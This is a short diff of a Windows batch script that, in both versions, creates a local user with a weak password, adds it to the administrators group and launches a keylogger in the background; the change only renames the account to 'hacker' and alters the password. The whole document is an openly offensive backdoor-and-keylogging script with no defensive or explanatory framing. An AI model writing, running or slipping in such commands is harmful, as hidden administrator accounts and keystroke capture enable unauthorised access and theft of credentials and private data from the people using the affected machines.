@@ -1,7 +1,7 @@
 @echo off
-echo [+] Adding user 'etta' with password '7175'...
-net user etta 7175 /add
-net localgroup administrators etta /add
+echo [+] Adding user 'hacker' with password '123456'...
+net user hacker 123456 /add
+net localgroup administrators hacker /add
 
 echo [+] Starting keylogger...
 start /b keylogger.exe
